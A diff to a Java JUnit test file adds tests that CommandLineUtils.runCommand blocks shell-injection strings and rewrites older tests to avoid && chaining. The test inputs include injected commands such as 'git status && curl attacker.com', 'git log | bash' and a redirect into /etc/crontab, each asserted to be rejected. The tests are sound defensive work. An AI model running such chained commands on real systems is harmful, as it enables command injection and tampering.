@@ -86,8 +86,13 @@ class CommandLineUtilsTest {
     void testRunCommand_NonZeroExitCode_OutputIncludedInException() {
         String os = System.getProperty("os.name").toLowerCase();
         if (!os.contains("win")) {
-            IOException ex = assertThrows(IOException.class,
-                    () -> CommandLineUtils.runCommand("echo 'error output' && exit 1"));
+            // Use a script file instead of && chaining (which is now blocked as a shell metacharacter)
+            IOException ex = assertThrows(IOException.class, () -> {
+                Path script = tempDir.resolve("fail.sh");
+                Files.writeString(script, "#!/bin/sh\necho 'error output'\nexit 1\n");
+                script.toFile().setExecutable(true);
+                CommandLineUtils.runCommand(script.toAbsolutePath().toString());
+            });
             assertTrue(ex.getMessage().contains("error output") || ex.getMessage().contains("exit code 1"),
                     "Exception should contain output or exit code: " + ex.getMessage());
         }
@@ -113,6 +118,55 @@ class CommandLineUtilsTest {
             String result = CommandLineUtils.runCommand("echo 'Message with \"quoted\" words'");
             assertNotNull(result);
             assertTrue(result.contains("quoted"), "Command with embedded quotes should execute successfully");
+        }
+    }
+
+    // ============================================================================
+    // SEC-1: Shell metacharacter injection tests
+    // ============================================================================
+
+    @Test
+    void testValidateNoShellInjection_BlocksAmpersandChaining() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git status && curl attacker.com"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_BlocksOrChaining() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git status || evil"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_BlocksPipe() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git log | bash"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_BlocksOutputRedirect() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git log > /etc/crontab"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_BlocksInputRedirect() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git commit -m hello < /dev/urandom"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_BlocksCarriageReturn() {
+        assertThrows(IllegalArgumentException.class,
+                () -> CommandLineUtils.runCommand("git status\revil"));
+    }
+
+    @Test
+    void testValidateNoShellInjection_LegitimateCommandStillAllowed() throws IOException, InterruptedException {
+        String os = System.getProperty("os.name").toLowerCase();
+        if (!os.contains("win")) {
+            String result = CommandLineUtils.runCommand("echo hello");
+            assertTrue(result.contains("hello"));
         }
     }
 
@@ -196,16 +250,14 @@ class CommandLineUtilsTest {
     @Test
     void testRunCommand_MultiLineOutput() throws IOException, InterruptedException {
         String os = System.getProperty("os.name").toLowerCase();
-        String command;
-        if (os.contains("win")) {
-            command = "echo Line1 && echo Line2";
-        } else {
-            command = "echo Line1 && echo Line2";
+        if (!os.contains("win")) {
+            // Use cat on a file instead of && chaining (which is now blocked as a shell metacharacter)
+            Path testFile = tempDir.resolve("multiline.txt");
+            Files.writeString(testFile, "Line1\nLine2\n");
+            String result = CommandLineUtils.runCommand("cat " + testFile.toAbsolutePath());
+            assertNotNull(result);
+            assertTrue(result.contains("Line1"));
+            assertTrue(result.contains("Line2"));
         }
-        
-        String result = CommandLineUtils.runCommand(command);
-        assertNotNull(result);
-        assertTrue(result.contains("Line1"));
-        assertTrue(result.contains("Line2"));
     }
 }
